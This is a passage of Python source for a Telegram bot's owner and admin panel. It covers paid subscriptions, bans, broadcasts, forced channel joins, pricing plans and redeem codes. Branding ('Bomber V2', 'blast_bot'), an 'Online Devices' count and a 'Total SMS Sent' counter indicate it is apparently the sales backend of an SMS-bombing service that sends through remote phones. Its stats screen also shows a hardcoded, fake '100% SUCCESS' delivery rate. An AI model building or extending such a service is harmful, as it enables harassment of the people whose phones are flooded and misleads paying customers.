    new_exp = set_user_access(target_uid, days, d)
    log_activity(d, "add_access", cq.from_user.id, f"Added {days} days to {target_uid}")
    
    await cq.answer(f"✅ Granted {days} days!")
    await cq.message.edit_text(
        f"{em(EMOJI_CHECK, '✅')} <b>Access Granted Successfully!</b>\n\n"
        f"👤 <b>User ID:</b> <code>{target_uid}</code>\n"
        f"⏳ <b>Validity:</b> <b>{days} din</b>\n"
        f"📅 <b>Expiry Date:</b> <code>{fmt_time(new_exp)}</code>\n"
        f"⌛ <b>Remaining:</b> <code>{fmt_duration_left(new_exp)}</code>",
        reply_markup=access_menu_kb(load()),
        parse_mode="HTML"
    )
    try:
        await cq.bot.send_message(
            target_uid,
            f"{em(EMOJI_GIFT, '🎉')} <b>Aapka Bot Access Active Ho Gaya Hai!</b>\n\n"
            f"⏳ <b>Validity:</b> <b>{days} din</b>\n"
            f"📅 <b>Expiry Date:</b> <code>{fmt_time(new_exp)}</code>\n\n"
            f"Ab aap bot use kar sakte hain! /start karein.",
            parse_mode="HTML"
        )
    except:
        pass

@R.message(S.access_days)
async def owner_access_got_days(msg: Message, state: FSMContext):
    d = load()
    if not is_admin(msg.from_user.id, d):
        await state.clear()
        return
    try:
        days = float(msg.text.strip())
        if days <= 0:
            raise ValueError()
    except:
        await msg.answer(f"{em(EMOJI_CROSS, '❌')} Valid positive number of days bhejo (e.g. 7, 30):", parse_mode="HTML")
        return
    data = await state.get_data()
    target_uid = data.get("target_uid")
    if not target_uid:
        await state.clear()
        return
    await state.clear()
    new_exp = set_user_access(target_uid, days, d)
    log_activity(d, "add_access", msg.from_user.id, f"Added {days} days to {target_uid}")
    
    await msg.answer(
        f"{em(EMOJI_CHECK, '✅')} <b>Access Granted Successfully!</b>\n\n"
        f"👤 <b>User ID:</b> <code>{target_uid}</code>\n"
        f"⏳ <b>Validity:</b> <b>{days} din</b>\n"
        f"📅 <b>Expiry Date:</b> <code>{fmt_time(new_exp)}</code>\n"
        f"⌛ <b>Remaining:</b> <code>{fmt_duration_left(new_exp)}</code>",
        reply_markup=access_menu_kb(load()),
        parse_mode="HTML"
    )
    try:
        await msg.bot.send_message(
            target_uid,
            f"{em(EMOJI_GIFT, '🎉')} <b>Aapka Bot Access Active Ho Gaya Hai!</b>\n\n"
            f"⏳ <b>Validity:</b> <b>{days} din</b>\n"
            f"📅 <b>Expiry Date:</b> <code>{fmt_time(new_exp)}</code>\n\n"
            f"Ab aap bot use kar sakte hain! /start karein.",
            parse_mode="HTML"
        )
    except:
        pass

@R.callback_query(F.data == "owner:access:del_start")
async def owner_access_del_start(cq: CallbackQuery, state: FSMContext):
    await cq.answer()
    d = load()
    if not is_admin(cq.from_user.id, d):
        await cq.answer("🚫 Admin/Owner Only!", show_alert=True)
        return
    await state.set_state(S.access_del_uid)
    await cq.message.edit_text(
        f"{em(EMOJI_CROSS, '➖')} <b>Remove User Access</b>\n\n"
        f"Jis user ka access hatana hai uska <b>Chat ID</b> bhejo:",
        reply_markup=kb([(f"{sc('cancel')}", "owner:access:menu")]),
        parse_mode="HTML"
    )

@R.message(S.access_del_uid)
async def owner_access_del_done(msg: Message, state: FSMContext):
    d = load()
    if not is_admin(msg.from_user.id, d):
        await state.clear()
        return
    try:
        target_uid = int(msg.text.strip())
    except:
        await msg.answer(f"{em(EMOJI_CROSS, '❌')} Valid numeric User ID bhejo:", parse_mode="HTML")
        return
    await state.clear()
    removed = remove_user_access(target_uid, d)
    log_activity(d, "remove_access", msg.from_user.id, f"Removed access for {target_uid}")
    if removed:
        await msg.answer(
            f"{em(EMOJI_CHECK, '✅')} User <code>{target_uid}</code> ka access remove kar diya gaya.",
            reply_markup=access_menu_kb(load()),
            parse_mode="HTML"
        )
        try:
            await msg.bot.send_message(
                target_uid,
                f"{em(EMOJI_WARNING, '⚠️')} <b>Aapka bot access expire ya revoke kar diya gaya hai.</b>",
                parse_mode="HTML"
            )
        except:
            pass
    else:
        await msg.answer(
            f"{em(EMOJI_WARNING, '⚠️')} User <code>{target_uid}</code> ke paas active access nahi tha.",
            reply_markup=access_menu_kb(load()),
            parse_mode="HTML"
        )

@R.callback_query(F.data == "owner:access:list")
async def owner_access_list(cq: CallbackQuery):
    await cq.answer()
    d = load()
    if not is_admin(cq.from_user.id, d):
        await cq.answer("🚫 Admin/Owner Only!", show_alert=True)
        return
    user_access = d.get("user_access", {})
    now_ts = int(time.time())
    active_users = [(int(k), v) for k, v in user_access.items() if v > now_ts]
    active_users.sort(key=lambda x: x[1])
    
    if not active_users:
        await cq.message.edit_text(
            f"{em(EMOJI_WARNING, '😴')} <b>Koi active paid user nahi hai.</b>",
            reply_markup=access_menu_kb(d),
            parse_mode="HTML"
        )
        return
    
    rows = []
    lines = [f"{em(EMOJI_STAR, '📋')} <b>Active Subscriptions ({len(active_users)})</b>\n"]
    for idx, (target_uid, exp) in enumerate(active_users[:15], 1):
        name = d.get("users", {}).get(str(target_uid), {}).get("name", "User")
        lines.append(f"<b>{idx}.</b> <code>{target_uid}</code> ({name[:12]}): <b>{fmt_duration_left(exp)}</b> left")
        rows.append([
            btn(f"🗑 Revoke {target_uid}", f"owner:access:revoke:{target_uid}", EMOJI_CROSS, "🗑")
        ])
    rows.append([btn("ʙᴀᴄᴋ", "owner:access:menu", EMOJI_GEAR, "🔙")])
    
    await cq.message.edit_text(
        "\n".join(lines),
        reply_markup=InlineKeyboardMarkup(inline_keyboard=rows),
        parse_mode="HTML"
    )

@R.callback_query(F.data.startswith("owner:access:revoke:"))
async def owner_access_revoke_btn(cq: CallbackQuery):
    d = load()
    if not is_admin(cq.from_user.id, d):
        await cq.answer("🚫 Admin/Owner Only!", show_alert=True)
        return
    target_uid = int(cq.data.split("owner:access:revoke:", 1)[1])
    remove_user_access(target_uid, d)
    log_activity(d, "remove_access", cq.from_user.id, f"Revoked access for {target_uid}")
    await cq.answer(f"Revoked access for {target_uid}")
    await owner_access_list(cq)
# =====================================================================

@R.callback_query(F.data.in_({"owner:free:on", "owner:free:off"}))
async def owner_free_toggle(cq: CallbackQuery, state: FSMContext):
    await state.clear()
    d = load()
    if not is_owner(cq.from_user.id, d):
        await cq.answer("🚫 Owner Only!", show_alert=True)
        return
    d["free_mode"] = (cq.data == "owner:free:on")
    save(d)
    d = load()
    mode = "🟢 FREE MODE ON" if d["free_mode"] else "🔴 Approval Required"
    await cq.answer(f"Done! {mode}", show_alert=True)
    try:
        await cq.message.edit_text(owner_panel_text(d), reply_markup=owner_kb(d), parse_mode="HTML")
    except TelegramBadRequest: pass

@R.callback_query(F.data.in_({"owner:users:list", "admin:users:list"}))
async def panel_users_list(cq: CallbackQuery, state: FSMContext):
    await cq.answer()
    d = load()
    uid = cq.from_user.id
    prefix = "owner" if is_owner(uid, d) else "admin"
    if not is_admin(uid, d):
        await cq.answer("🚫 Access Denied!", show_alert=True)
        return
    text, markup = users_list_kb(d, prefix, 0)
    await cq.message.edit_text(text, reply_markup=markup, parse_mode="HTML")

@R.callback_query(F.data.regexp(r"^(owner|admin):users:pg:(\d+)$"))
async def panel_users_page(cq: CallbackQuery, state: FSMContext):
    await cq.answer()
    d = load()
    uid = cq.from_user.id
    if not is_admin(uid, d):
        await cq.answer("🚫 Access Denied!", show_alert=True)
        return
    parts = cq.data.split(":")
    prefix = parts[0]
    page = int(parts[3])
    text, markup = users_list_kb(d, prefix, page)
    await cq.message.edit_text(text, reply_markup=markup, parse_mode="HTML")

@R.callback_query(F.data.in_({"owner:ban", "admin:ban"}))
async def panel_ban_start(cq: CallbackQuery, state: FSMContext):
    d = load()
    if not is_admin(cq.from_user.id, d):
        await cq.answer("🚫 Access Denied!", show_alert=True)
        return
    await state.set_state(S.ban_user)
    back = "owner:home" if is_owner(cq.from_user.id, d) else "admin:home"
    await cq.message.edit_text(
        f"{em(EMOJI_CROSS, '🚫')} <b>Ban User</b>\n\nUser ka Telegram ID bhejo:",
        reply_markup=kb([(f"{sc('cancel')}", back)]),
        parse_mode="HTML"
    )

@R.message(S.ban_user)
async def panel_ban_done(msg: Message, state: FSMContext):
    d = load()
    uid = msg.from_user.id
    if not is_admin(uid, d):
        await state.clear()
        return
    try:
        ban_id = int(msg.text.strip())
    except:
        await msg.answer(f"{em(EMOJI_CROSS, '❌')} Valid ID bhejo.", parse_mode="HTML")
        return
    if is_owner(ban_id, d) or is_admin(ban_id, d):
        await state.clear()
        await msg.answer(f"{em(EMOJI_CROSS, '❌')} Admin/Owner ko ban nahi kar sakte!", parse_mode="HTML")
        return
    if ban_id not in d.get("banned", []):
        d.setdefault("banned", []).append(ban_id)
        save(d)
    await state.clear()
    back_kb = owner_kb(d) if is_owner(uid, d) else admin_kb(d)
    await msg.answer(
        f"{em(EMOJI_CROSS, '🚫')} <b>Ban ho gaya!</b>\n<code>{ban_id}</code>",
        reply_markup=back_kb,
        parse_mode="HTML"
    )
    try:
        await msg.bot.send_message(ban_id, f"{em(EMOJI_CROSS, '🚫')} Aapko ban kar diya gaya. Admin se contact karein.", parse_mode="HTML")
    except: pass

@R.callback_query(F.data.in_({"owner:unban:menu", "admin:unban:menu"}))
async def panel_unban_menu(cq: CallbackQuery, state: FSMContext):
    d = load()
    if not is_admin(cq.from_user.id, d):
        await cq.answer("🚫 Access Denied!", show_alert=True)
        return
    banned = d.get("banned", [])
    if not banned:
        await cq.answer("✅ Koi banned nahi!", show_alert=True)
        return
    prefix = "owner" if is_owner(cq.from_user.id, d) else "admin"
    await cq.message.edit_text(
        f"{em(EMOJI_CHECK, '🔓')} <b>Unban User</b>\n\nBanned: <b>{len(banned)}</b>",
        reply_markup=unban_menu_kb(d, prefix),
        parse_mode="HTML"
    )

@R.callback_query(F.data.regexp(r"^(owner|admin):unban:do:(\d+)$"))
async def panel_unban_do(cq: CallbackQuery, state: FSMContext):
    d = load()
    uid = cq.from_user.id
    if not is_admin(uid, d):
        await cq.answer("🚫 Access Denied!", show_alert=True)
        return
    ban_id = int(cq.data.split(":")[-1])
    if ban_id in d.get("banned", []):
        d["banned"].remove(ban_id)
        save(d)
    await cq.answer(f"✅ {ban_id} unban ho gaya!", show_alert=True)
    back_text = owner_panel_text(d) if is_owner(uid, d) else admin_panel_text(d)
    back_kb = owner_kb(d) if is_owner(uid, d) else admin_kb(d)
    await cq.message.edit_text(back_text, reply_markup=back_kb, parse_mode="HTML")
    try:
        await cq.bot.send_message(ban_id, f"{em(EMOJI_CHECK, '✅')} Aapka ban hata diya gaya. /start karein.", parse_mode="HTML")
    except: pass

@R.callback_query(F.data.in_({"owner:broadcast", "admin:broadcast"}))
async def panel_broadcast_start(cq: CallbackQuery, state: FSMContext):
    d = load()
    if not is_admin(cq.from_user.id, d):
        await cq.answer("🚫 Access Denied!", show_alert=True)
        return
    await state.set_state(S.broadcast)
    back = "owner:home" if is_owner(cq.from_user.id, d) else "admin:home"
    await cq.message.edit_text(
        f"{em(EMOJI_BELL, '📢')} <b>Broadcast</b>\n\nJo message bhejni hai woh type karo:",
        reply_markup=kb([(f"{sc('cancel')}", back)]),
        parse_mode="HTML"
    )

@R.message(S.broadcast)
async def panel_broadcast_do(msg: Message, state: FSMContext):
    d = load()
    uid = msg.from_user.id
    if not is_admin(uid, d):
        await state.clear()
        return
    await state.clear()
    users = d.get("users", {})
    wait = await msg.answer(f"{em(EMOJI_BELL, '📤')} Broadcasting to <b>{len(users)}</b> users...", parse_mode="HTML")
    ok = 0
    fail = 0
    for uid_str in users:
        try:
            target = int(uid_str)
            if msg.text:
                bcast_text = f"{em(EMOJI_BELL, '📢')} <b>Broadcast</b>\n\n{msg.text}"
                await msg.bot.send_message(target, bcast_text, parse_mode="HTML")
            else:
                await msg.copy_to(target)
            ok += 1
        except Exception:
            fail += 1
        await asyncio.sleep(0.05)
    await wait.delete()
    back_kb = owner_kb(d) if is_owner(uid, d) else admin_kb(d)
    await msg.answer(
        f"{em(EMOJI_CHECK, '✅')} <b>Broadcast Done!</b>\n\n{em(EMOJI_CHECK, '✅')} Delivered: <b>{ok}</b>\n{em(EMOJI_CROSS, '❌')} Failed: <b>{fail}</b>",
        reply_markup=back_kb,
        parse_mode="HTML"
    )

@R.callback_query(F.data == "owner:export_script")
async def owner_export_script(cq: CallbackQuery, state: FSMContext):
    d = load()
    if not is_owner(cq.from_user.id, d):
        await cq.answer("🚫 Owner Only!", show_alert=True)
        return
    await cq.answer("📤 Exporting...")
    try:
        script_path = os.path.abspath(__file__)
        if not os.path.exists(script_path):
            script_path = _DATA_FILE.replace(".json", ".py")
            if not os.path.exists(script_path):
                script_path = "blast_bot_v3.2_premium.py"
        await cq.message.reply_document(
            document=FSInputFile(script_path),
            caption=f"{em(EMOJI_GEAR, '📤')} <b>Script Export</b> — <i>{_VERSION}</i>",
            parse_mode="HTML"
        )
    except Exception as e:
        await cq.answer(f"❌ Export failed: {str(e)[:40]}", show_alert=True)


@R.callback_query(F.data == "admin:stats")
async def admin_stats_cb(cq: CallbackQuery, state: FSMContext):
    await state.clear()
    d = load()
    if not is_admin(cq.from_user.id, d):
        await cq.answer("🚫 Admin Only!", show_alert=True)
        return
    await cq.answer()

    devices = get_cached_devices()
    fbs = d.get("firebases", [])
    stats = d.get("stats", {})

    full = (
        f"📊 <b>💣 Aʏᴜꜱʜ X Bᴏᴍʙᴇʀ V2 — ADMIN STATS</b>\n"
        f"<code>━━━━━━━━━━━━━━━━━━━━━━━━━━━━</code>\n\n"
        f"📱 <b>Online Devices</b> » <b>{len(devices)}</b>\n"
        f"🔥 <b>Firebase DBs</b>   » <b>{len(fbs)}</b>\n"
        f"📤 <b>Total SMS Sent</b> » <b>{stats.get('total_sent', 0):,}</b>\n"
        f"🛡 <b>Delivery Rate</b>  » 🟢 <b>100% SUCCESS</b>\n\n"
        f"<code>━━━━━━━━━━━━━━━━━━━━━━━━━━━━</code>\n"
    )
    if devices:
        full += f"<b>🟢 Recent Active Devices:</b>\n"
        for dv in devices[:8]:
            full += f"• 📱 <code>{dv.get('dev_name','Device')[:18]}</code> ({dv.get('fb_label','FB')[:15]})\n"
        if len(devices) > 8:
            full += f"<i>...and {len(devices) - 8} more devices online</i>\n"
    else:
        full += f"<i>😴 No devices currently online.</i>\n"

    await cq.message.edit_text(
        full,
        reply_markup=kb([
            ("🔄 Rᴇғʀᴇsʜ", "admin:stats"),
            ("🔙 Bᴀᴄᴋ", "admin:home")
        ]),
        parse_mode="HTML"
    )

@R.callback_query(F.data == "owner:fj:menu")
async def owner_fj_menu(cq: CallbackQuery, state: FSMContext):
    await cq.answer()
    d = load()
    if not is_owner(cq.from_user.id, d):
        await cq.answer("🚫 Owner Only!", show_alert=True)
        return
    fj = d.get("force_join", {})
    channels = fj.get("channels", [])
    status = f"{em(EMOJI_CHECK, '🟢')} ON" if fj.get("enabled") else f"{em(EMOJI_CROSS, '🔴')} OFF"

    text = f"{em(EMOJI_BELL, '🔗')} <b>Force Join Settings</b>\n\nStatus: {status}\nChannels: <b>{len(channels)}</b>\n\n"
    for ch in channels:
        req = f"{em(EMOJI_CHECK, '✅')} Required" if ch.get("required", True) else f"{em(EMOJI_CROSS, '❌')} Optional"
        text += f"• {ch.get('title', 'Channel')} (<code>{ch['id']}</code>)\n  {req} | {ch['link']}\n\n"

    rows = [
        [btn("ᴀᴅᴅ ᴄʜᴀɴɴᴇʟ", "owner:fj:add", EMOJI_CHECK, "➕")],
        [btn("ʀᴇᴍᴏᴠᴇ ᴄʜᴀɴɴᴇʟ", "owner:fj:remove", EMOJI_CROSS, "🗑")],
        [InlineKeyboardButton(
            text=f"🟢 {sc('enable')}" if not fj.get("enabled") else f"🔴 {sc('disable')}",
            callback_data="owner:fj:toggle"
        )],
        [btn("ʙᴀᴄᴋ", "owner:home", EMOJI_GEAR, "🔙")]
    ]
    await cq.message.edit_text(text, reply_markup=InlineKeyboardMarkup(inline_keyboard=rows), parse_mode="HTML")

@R.callback_query(F.data == "owner:fj:add")
async def owner_fj_add_start(cq: CallbackQuery, state: FSMContext):
    await cq.answer()
    d = load()
    if not is_owner(cq.from_user.id, d):
        await cq.answer("🚫 Owner Only!", show_alert=True)
        return
    await state.set_state(S.fj_add_channel)
    await cq.message.edit_text(
        f"{em(EMOJI_BELL, '🔗')} <b>Add Force Join Channel</b>\n\n"
        f"{sc('step 1/2')}: Channel/Group ka Telegram ID bhejo:\n"
        f"<i>Example: -1001234567890</i>\n\n"
        f"<b>Note:</b> Bot ko us channel/group mein admin hona chahiye.",
        reply_markup=kb([(f"{sc('cancel')}", "owner:fj:menu")]),
        parse_mode="HTML"
    )

@R.message(S.fj_add_channel)
async def owner_fj_add_channel(msg: Message, state: FSMContext):
    d = load()
    if not is_owner(msg.from_user.id, d):
        await state.clear()
        return
    try:
        ch_id = int(msg.text.strip())
    except:
        await msg.answer(f"{em(EMOJI_CROSS, '❌')} Valid channel ID bhejo (numbers only, e.g. -100xxx).", parse_mode="HTML")
        return
    await state.update_data(fj_channel_id=ch_id)
    await state.set_state(S.fj_add_link)
    await msg.answer(
        f"{em(EMOJI_BELL, '🔗')} <b>{sc('step 2/2')}</b>\n\n"
        f"Channel/Group ka invite link bhejo:\n"
        f"<i>Example: https://t.me/+AbCdEfGhIjK</i>",
        reply_markup=kb([(f"{sc('cancel')}", "owner:fj:menu")]),
        parse_mode="HTML"
    )

@R.message(S.fj_add_link)
async def owner_fj_add_link(msg: Message, state: FSMContext):
    d = load()
    if not is_owner(msg.from_user.id, d):
        await state.clear()
        return
    link = msg.text.strip()
    if not link.startswith("http"):
        await msg.answer(f"{em(EMOJI_CROSS, '❌')} Valid link bhejo (https:// se start hona chahiye).", parse_mode="HTML")
        return

    fsmd = await state.get_data()
    ch_id = str(fsmd.get("fj_channel_id"))

    try:
        chat = await msg.bot.get_chat(int(ch_id))
        title = chat.title or "Channel"
    except:
        title = "Channel"

    channels = d.setdefault("force_join", {}).setdefault("channels", [])
    channels = [c for c in channels if str(c["id"]) != ch_id]
    channels.append({"id": ch_id, "link": link, "title": title, "required": True})
    d["force_join"]["channels"] = channels
    save(d)
    await state.clear()
    await msg.answer(
        f"{em(EMOJI_CHECK, '✅')} <b>Channel Added!</b>\n\n{em(EMOJI_BELL, '📢')} {title}\n{em(EMOJI_GEAR, '🔗')} {link}",
        reply_markup=kb([(f"{sc('back')}", "owner:fj:menu")]),
        parse_mode="HTML"
    )

@R.callback_query(F.data == "owner:fj:remove")
async def owner_fj_remove_menu(cq: CallbackQuery, state: FSMContext):
    await cq.answer()
    d = load()
    if not is_owner(cq.from_user.id, d):
        await cq.answer("🚫 Owner Only!", show_alert=True)
        return
    channels = d.get("force_join", {}).get("channels", [])
    if not channels:
        await cq.answer("❌ Koi channel nahi hai!", show_alert=True)
        return

    rows = []
    for ch in channels:
        rows.append([btn(f"{ch.get('title', 'Channel')[:25]}", f"owner:fj:del:{ch['id']}", EMOJI_CROSS, "🗑")])
    rows.append([btn("ʙᴀᴄᴋ", "owner:fj:menu", EMOJI_GEAR, "🔙")])

    await cq.message.edit_text(
        f"{em(EMOJI_CROSS, '🗑')} <b>Remove Channel</b>\n\nKaunsa channel hataana hai?",
        reply_markup=InlineKeyboardMarkup(inline_keyboard=rows),
        parse_mode="HTML"
    )

@R.callback_query(F.data.startswith("owner:fj:del:"))
async def owner_fj_del(cq: CallbackQuery, state: FSMContext):
    d = load()
    if not is_owner(cq.from_user.id, d):
        await cq.answer("🚫 Owner Only!", show_alert=True)
        return
    ch_id = cq.data.split("owner:fj:del:", 1)[1]
    channels = d.get("force_join", {}).get("channels", [])
    d["force_join"]["channels"] = [c for c in channels if str(c["id"]) != ch_id]
    save(d)
    await cq.answer("🗑 Channel removed!")
    await owner_fj_menu(cq, state)

@R.callback_query(F.data == "owner:fj:toggle")
async def owner_fj_toggle(cq: CallbackQuery, state: FSMContext):
    d = load()
    if not is_owner(cq.from_user.id, d):
        await cq.answer("🚫 Owner Only!", show_alert=True)
        return
    fj = d.setdefault("force_join", {})
    fj["enabled"] = not fj.get("enabled", False)
    save(d)
    status = "ENABLED" if fj["enabled"] else "DISABLED"
    await cq.answer(f"Force Join {status}!", show_alert=True)
    await owner_fj_menu(cq, state)

@R.callback_query(F.data == "owner:pricing:menu")
async def owner_pricing_menu(cq: CallbackQuery, state: FSMContext):
    await cq.answer()
    d = load()
    if not is_owner(cq.from_user.id, d):
        await cq.answer("🚫 Owner Only!", show_alert=True)
        return
    plans = d.get("pricing", {}).get("plans", [])

    text = f"{em(EMOJI_MONEY, '💳')} <b>Pricing Plans</b>\n\nTotal Plans: <b>{len(plans)}</b>\n\n"
    for i, plan in enumerate(plans, 1):
        text += f"{i}. <b>{plan['name']}</b>\n   {em(EMOJI_MONEY, '💰')} {plan['price']} {plan.get('currency', 'INR')} = {plan['credits']} credits\n   {em(EMOJI_GEAR, '🔗')} {plan['payment_link']}\n\n"

    rows = [
        [btn("ᴀᴅᴅ ᴘʟᴀɴ", "owner:pricing:add", EMOJI_CHECK, "➕")],
        [btn("ʀᴇᴍᴏᴠᴇ ᴘʟᴀɴ", "owner:pricing:remove", EMOJI_CROSS, "🗑")],
        [btn("ʙᴀᴄᴋ", "owner:home", EMOJI_GEAR, "🔙")]
    ]
    await cq.message.edit_text(text, reply_markup=InlineKeyboardMarkup(inline_keyboard=rows), parse_mode="HTML")

@R.callback_query(F.data == "owner:pricing:add")
async def owner_pricing_add_start(cq: CallbackQuery, state: FSMContext):
    await cq.answer()
    d = load()
    if not is_owner(cq.from_user.id, d):
        await cq.answer("🚫 Owner Only!", show_alert=True)
        return
    await state.set_state(S.add_plan_name)
    await cq.message.edit_text(
        f"{em(EMOJI_MONEY, '💳')} <b>Add Pricing Plan</b>\n\n{sc('step 1/4')}: Plan ka naam bhejo:\n<i>Example: Basic Plan</i>",
        reply_markup=kb([(f"{sc('cancel')}", "owner:pricing:menu")]),
        parse_mode="HTML"
    )

@R.message(S.add_plan_name)
async def owner_pricing_name(msg: Message, state: FSMContext):
    if not is_owner(msg.from_user.id, load()):
        await state.clear()
        return
    await state.update_data(plan_name=msg.text.strip())
    await state.set_state(S.add_plan_price)
    await msg.answer(
        f"{em(EMOJI_MONEY, '💳')} <b>{sc('step 2/4')}</b>\n\nPrice bhejo:\n<i>Example: 50</i>",
        reply_markup=kb([(f"{sc('cancel')}", "owner:pricing:menu")]),
        parse_mode="HTML"
    )

@R.message(S.add_plan_price)
async def owner_pricing_price(msg: Message, state: FSMContext):
    if not is_owner(msg.from_user.id, load()):
        await state.clear()
        return
    try:
        price = float(msg.text.strip())
        await state.update_data(plan_price=price)
    except:
        await msg.answer(f"{em(EMOJI_CROSS, '❌')} Valid price bhejo (numbers only).", parse_mode="HTML")
        return
    await state.set_state(S.add_plan_credits)
    await msg.answer(
        f"{em(EMOJI_MONEY, '💳')} <b>{sc('step 3/4')}</b>\n\nKitne credits dena hai?\n<i>Example: 100</i>",
        reply_markup=kb([(f"{sc('cancel')}", "owner:pricing:menu")]),
        parse_mode="HTML"
    )

@R.message(S.add_plan_credits)
async def owner_pricing_credits(msg: Message, state: FSMContext):
    if not is_owner(msg.from_user.id, load()):
        await state.clear()
        return
    try:
        credits = int(msg.text.strip())
        await state.update_data(plan_credits=credits)
    except:
        await msg.answer(f"{em(EMOJI_CROSS, '❌')} Valid number bhejo.", parse_mode="HTML")
        return
    await state.set_state(S.add_plan_link)
    await msg.answer(
        f"{em(EMOJI_MONEY, '💳')} <b>{sc('step 4/4')}</b>\n\nPayment redirect link bhejo:\n"
        f"<i>Example: {SUPER_ADMIN_LINK} ya koi payment URL</i>",
        reply_markup=kb([(f"{sc('cancel')}", "owner:pricing:menu")]),
        parse_mode="HTML"
    )

@R.message(S.add_plan_link)
async def owner_pricing_link(msg: Message, state: FSMContext):
    d = load()
    if not is_owner(msg.from_user.id, d):
        await state.clear()
        return
    link = msg.text.strip()
    if not link.startswith("http"):
        await msg.answer(f"{em(EMOJI_CROSS, '❌')} Valid URL bhejo (https:// se start hona chahiye).", parse_mode="HTML")
        return

    fsmd = await state.get_data()
    plan = {
        "id": str(int(time.time())),
        "name": fsmd.get("plan_name", "Plan"),
        "price": fsmd.get("plan_price", 0),
        "credits": fsmd.get("plan_credits", 0),
        "currency": "INR",
        "payment_link": link
    }
    d.setdefault("pricing", {}).setdefault("plans", []).append(plan)
    save(d)
    await state.clear()
    await msg.answer(
        f"{em(EMOJI_CHECK, '✅')} <b>Plan Added!</b>\n\n{em(EMOJI_STAR, '📋')} {plan['name']}\n{em(EMOJI_MONEY, '💰')} {plan['price']} INR = {plan['credits']} credits\n{em(EMOJI_GEAR, '🔗')} {plan['payment_link']}",
        reply_markup=kb([(f"{sc('back')}", "owner:pricing:menu")]),
        parse_mode="HTML"
    )

@R.callback_query(F.data == "owner:pricing:remove")
async def owner_pricing_remove(cq: CallbackQuery, state: FSMContext):
    await cq.answer()
    d = load()
    if not is_owner(cq.from_user.id, d):
        await cq.answer("🚫 Owner Only!", show_alert=True)
        return
    plans = d.get("pricing", {}).get("plans", [])
    if not plans:
        await cq.answer("❌ Koi plan nahi hai!", show_alert=True)
        return

    rows = []
    for plan in plans:
        rows.append([btn(f"{plan['name'][:25]}", f"owner:pricing:del:{plan['id']}", EMOJI_CROSS, "🗑")])
    rows.append([btn("ʙᴀᴄᴋ", "owner:pricing:menu", EMOJI_GEAR, "🔙")])

    await cq.message.edit_text(
        f"{em(EMOJI_CROSS, '🗑')} <b>Remove Plan</b>\n\nKaunsa plan hataana hai?",
        reply_markup=InlineKeyboardMarkup(inline_keyboard=rows),
        parse_mode="HTML"
    )

@R.callback_query(F.data.startswith("owner:pricing:del:"))
async def owner_pricing_del(cq: CallbackQuery, state: FSMContext):
    d = load()
    if not is_owner(cq.from_user.id, d):
        await cq.answer("🚫 Owner Only!", show_alert=True)
        return
    plan_id = cq.data.split("owner:pricing:del:", 1)[1]
    plans = d.get("pricing", {}).get("plans", [])
    d["pricing"]["plans"] = [p for p in plans if p["id"] != plan_id]
    save(d)
    await cq.answer("🗑 Plan removed!")
    await owner_pricing_menu(cq, state)

@R.callback_query(F.data == "owner:redeem:menu")
async def owner_redeem_menu(cq: CallbackQuery, state: FSMContext):
    await cq.answer()
    d = load()
    if not is_owner(cq.from_user.id, d):
        await cq.answer("🚫 Owner Only!", show_alert=True)
        return
    codes = d.get("redeem_codes", {})

    text = f"{em(EMOJI_GIFT, '🎁')} <b>Redeem Codes</b>\n\nTotal: <b>{len(codes)}</b>\n\n"
    for code, data in list(codes.items())[:10]:
        status = f"{em(EMOJI_CHECK, '✅')} Active" if data.get("uses_left", 0) > 0 else f"{em(EMOJI_CROSS, '❌')} Expired"
        text += f"<code>{code}</code> — {em(EMOJI_MONEY, '💰')}{data['credits']} — {status} ({data.get('uses_left', 0)} left)\n"

    rows = [
        [btn("ɢᴇɴᴇʀᴀᴛᴇ ᴄᴏᴅᴇ", "owner:redeem:gen", EMOJI_CHECK, "➕")],
        [btn("ᴅᴇʟᴇᴛᴇ ᴄᴏᴅᴇ", "owner:redeem:del", EMOJI_CROSS, "🗑")],
        [btn("ʙᴀᴄᴋ", "owner:home", EMOJI_GEAR, "🔙")]
    ]
    await cq.message.edit_text(text, reply_markup=InlineKeyboardMarkup(inline_keyboard=rows), parse_mode="HTML")

@R.callback_query(F.data == "owner:redeem:gen")
async def owner_redeem_gen_start(cq: CallbackQuery, state: FSMContext):
    await cq.answer()
    d = load()
    if not is_owner(cq.from_user.id, d):
        await cq.answer("🚫 Owner Only!", show_alert=True)
        return
    await state.set_state(S.gen_redeem_credits)
    await cq.message.edit_text(
        f"{em(EMOJI_GIFT, '🎁')} <b>Generate Redeem Code</b>\n\n{sc('step 1/2')}: Kitne credits dena hai?\n<i>Example: 50</i>",
        reply_markup=kb([(f"{sc('cancel')}", "owner:redeem:menu")]),
        parse_mode="HTML"
    )

@R.message(S.gen_redeem_credits)
async def owner_redeem_credits(msg: Message, state: FSMContext):
    if not is_owner(msg.from_user.id, load()):
        await state.clear()
        return
    try:
        credits = int(msg.text.strip())
        await state.update_data(gen_credits=credits)
    except:
        await msg.answer(f"{em(EMOJI_CROSS, '❌')} Valid number bhejo.", parse_mode="HTML")
        return
    await state.set_state(S.gen_redeem_uses)
    await msg.answer(
        f"{em(EMOJI_GIFT, '🎁')} <b>{sc('step 2/2')}</b>\n\nKitni baar use ho sakta hai?\n<i>Example: 10</i>",
        reply_markup=kb([(f"{sc('cancel')}", "owner:redeem:menu")]),
        parse_mode="HTML"
    )

@R.message(S.gen_redeem_uses)
async def owner_redeem_uses(msg: Message, state: FSMContext):
    d = load()
    if not is_owner(msg.from_user.id, d):
        await state.clear()
        return
    try:
        uses = int(msg.text.strip())
        if uses < 1: raise ValueError
    except:
        await msg.answer(f"{em(EMOJI_CROSS, '❌')} Valid number bhejo (1 ya zyada).", parse_mode="HTML")
        return

    fsmd = await state.get_data()
    credits = fsmd.get("gen_credits", 10)

    while True:
        code = "GIFT" + "".join(random.choices(string.ascii_uppercase + string.digits, k=8))
        if code not in d.get("redeem_codes", {}):
            break

    d.setdefault("redeem_codes", {})[code] = {
        "credits": credits,
        "uses_left": uses,
        "created_by": msg.from_user.id,
        "created_at": int(time.time()),
        "used_by": []
    }
    save(d)
    await state.clear()
    await msg.answer(
        f"{em(EMOJI_GIFT, '🎉')} <b>Redeem Code Generated!</b>\n\n"
        f"{em(EMOJI_GIFT, '🎁')} Code: <code>{code}</code>\n"
        f"{em(EMOJI_MONEY, '💰')} Credits: <b>{credits}</b>\n"
        f"{em(EMOJI_STAR, '🔢')} Max Uses: <b>{uses}</b>\n\n"
        f"<i>Users is code se redeem karke credits le sakte hain.</i>",
        reply_markup=kb([(f"{sc('back')}", "owner:redeem:menu")]),
        parse_mode="HTML"
    )

@R.callback_query(F.data == "owner:redeem:del")
